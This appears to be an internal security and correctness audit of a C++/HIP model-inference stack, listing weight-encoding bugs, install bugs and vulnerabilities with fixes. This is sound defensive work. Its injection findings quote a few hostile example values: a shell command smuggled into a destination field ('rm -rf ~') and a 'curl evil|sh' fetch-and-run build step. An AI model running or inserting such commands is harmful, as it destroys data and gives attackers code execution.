# Stack-wide audit — 2026-04-26

8 cpp-hip-experts ran in parallel against the C++23 port (`cpp/`), the
HIP kernel subtree (`rocm-cpp/`), and operational infra (packages.toml,
systemd, packaging, CI). Read-only review. Surfaced 9 critical bugs and
~30 high-priority issues. **Sherry regression root cause confirmed in
two orthogonal places.**

## 🔴 Critical — Sherry regression (the user's "baby")

The 3 Sherry-packed `.h1b` files all emit "cluster cluster…" garbage
under `bitnet_decode`. Two independent encoder/loader bugs combine:

1. **Wrong-kernel route via flag bit.**
   `rocm-cpp/tools/h1b_repack_sherry.cpp:301` sets
   `H1B_FLAG_SHERRY_FP16` (`0x2`). Loader at
   `rocm-cpp/src/h1b_loader.cpp:723-724,743` then dispatches through
   the fp16 GEMV kernel (`src/sherry_gemv.hip`), which performs pure
   ±1 fp16-in/fp16-out — **no per-row scale recovery**. The repack
   tool writes per-row fp32 scales every tensor; only the i8 kernel
   (`kernels/ternary_gemv_sherry.hip:235`) consumes them. fp16 path
   discards them silently. Magnitudes off 20-100×, residual stream
   diverges by layer 2.
   **Fix:** drop the `| 0x2` so the loader routes
   `RCPP_WEIGHT_FORMAT_SHERRY_I8`.

2. **Encoder corrupts weights with multiple zeros per group.**
   `cpp/tools/h1b-sherry/include/onebit/tools/h1b_sherry.hpp:112`
   `encode_group` maps `v == 0 → bit=1` on surviving lanes
   (`pick_zero_pos` only chooses ONE zero per group). Decoder
   (`kernels/ternary_gemv_sherry.hip:47`,
   `rocm-cpp/src/sherry_gemv.hip:214`) reads `bit=1 → +1`. Trained
   ternary weights at 60-80% sparsity have many groups with ≥2
   zeros; every extra zero is silently flipped to `+1`. Billions of
   corrupted weights.
   **Fix:** error or deterministically flip to `±1` at encode AND
   bound `forced_zero_flips` in the convert-tool report.

## 🔴 Critical — `1bit install` broken on fresh box

`cpp/cli/src/package.cpp:13-28` `expand_placeholder` only matches whole
strings `$HOME` / `$USER`; doesn't substitute `${HOME}` substrings.
Every `${HOME}/.local/bin/...` arg in `packages.toml` is passed VERBATIM
to `install -Dm755`, creating a literal `${HOME}` directory under the
working directory. `core` / `voice` / `echo` / `mcp` / `ingest` /
`stream` install recipes silently mis-place every binary on a fresh box.
`tts-engine` / `image-engine` use `~/` and work; that's the bandaid that
hid the bug.

**Fix:** extend `expand_tilde` (or add a new pass) to substitute
`${HOME}` and `$HOME` substrings, not just whole-string matches.

## 🔴 Critical — CLI 3 RCE vectors

1. `cpp/cli/src/install.cpp:127-134`
   `popen("sudo tee " + dest.string(), "w")` composes shell. `dest`
   flows from user `packages.local.toml` `files[].dst`. Overlay sets
   `dst = "/etc/sudoers.d/x; rm -rf ~"`, shell runs it. Untrusted
   manifest field reaches `/bin/sh -c`.
   **Fix:** `run_inherit({"sudo","tee",dest.string()})` argv form.
2. `cpp/cli/src/registry.cpp:74,77` `merge_into` lets overlay
   overwrite canonical `build` / `files` / `check` arrays. Overlay
   `build = [["sh","-c","curl evil|sh"]]` is then executed by
   `run_argv`. Same RCE class via the user-overlay channel.
   **Fix:** reject overlay overwrites of canonical exec arrays;
   allow overlay-only entries with explicit confirm flag.
3. `cpp/cli/src/install.cpp:240` overlay `dst` taken as-is; `..`
   traversal unchecked. Path escape outside the install root.
   **Fix:** `weakly_canonical` + containment check.

## 🔴 Critical — Stream auth fail-open

`cpp/stream/src/auth.cpp:121-123` `check_admin` returns `Allow` when
`admin_bearer.empty()`. Default empty when env unset. `POST
/internal/reindex` (`handlers.cpp:242`) is world-callable until the
operator remembers to `export HALO_STREAM_ADMIN_BEARER=...`.

**Fix:** return `ServerMisconfigured` when admin secret empty (mirror
`check_premium`).

`cpp/tier-mint/src/state.cpp:63` only checks `admin_secret ==
jwt_secret`; `btcpay_webhook_secret` not compared, not length-checked.
Confused-deputy: webhook secret reused as JWT signing key would let
BTCPay forge premium JWTs.

## 🔴 Critical — Echo WebSocket RFC 6455 violations

`cpp/echo/src/ws.cpp` is hand-rolled. Three RFC violations / DoS:

1. `:263` — client→server unmasked frames not rejected. RFC §5.1
   mandates close 1002 on `MASK=0` from client. Today fail-OPEN.
2. `:305-309` — fragmented `FIN=0` frames pre-`resize()` payload up
   to 64 MiB before reading. Spam at line-rate forces 64 MiB alloc
   per frame. DoS.
3. `:264-279` — 64-bit length: no MSB-must-be-0 check. `len = 0` then
   `len = (len<<8)|ext[k]` accepts `0xFFFFFFFFFFFFFFFF`. Cap at 64 MiB
   catches it after the fact, but RFC requires close 1002.

`cpp/voice/src/sse_client.cpp:46-81` fail-OPEN on `https://`. Comment
claims "loopback only" but nothing enforces. Config drift can egress
prompts cleartext to remote `:443`.

## 🔴 Critical — GGUF parser integer overflow

`cpp/core/src/gguf.cpp:258-270` `tensor_bytes` checks `base >
impl_->size` but a malicious `info.offset = SIZE_MAX - data_off + 1`
overflows `base` to a small valid value. Returned span claims
`impl_->size - base` bytes the caller treats as raw weight data.

`:104, 217` `arr->items.reserve(*n)` / `tensors_.reserve(*n_tensors)`
unbounded `uint64_t` from file. Malicious GGUF with `n = 1<<40` →
OOM/abort before any data read.

`:251` `(alignment - (cur % alignment)) % alignment` — div by zero if
`general.alignment` from file is `0`.

**Fix:** port `cpp/core/src/h1b.cpp:148-154`'s checked-arithmetic
pattern (`bytes_ > impl_->size - offset`).

## 🔴 Critical — Helm bearer file race

`cpp/helm/src/bearer.cpp:71-80`. `std::ofstream` creates with default
umask (typically `0644`) BEFORE `chmod 0600`. Local attacker with read
access to `~/.config/1bit-helm/` can `open()` in the window. Also
missing `O_NOFOLLOW` (symlink-swap on the config dir).

**Fix:** `::open(path, O_WRONLY|O_CREAT|O_TRUNC|O_NOFOLLOW, 0600)` then
`fdopen`.

`cpp/helm/src/conv_log.cpp:39` filename = seconds since epoch only. Two
flushes within the same second silently overwrite via `ios::trunc`.

## 🔴 Critical — h1b layout divergence

`cpp/core/src/h1b.cpp:89-122` reads cfg as
`[hidden, intermediate, num_heads, num_kv_heads, num_layers, vocab,
max_seq_len, flags]` and expects a layer-offset table at byte 64.
Runtime tools (`gguf-to-h1b`, `h1b-sherry`, `bitnet-to-tq2`) and
`rocm-cpp/src/h1b_loader.cpp:678-722` write the streaming layout
`[hs, is_, L, nh, nkv, vocab, max_seq_len, tie, reserved]` followed
by inline embedding/norms/tensors. **`onebit::core::h1b::File` reads
fields out of order, treats `tie` as `flags`, fabricates a non-existent
offset table.** Currently no runtime path uses it (only its own test).

**Fix:** delete the `cpp/core/src/h1b.cpp` parser; promote the
streaming layout the tools actually write to canonical
`onebit::core::h1b`.
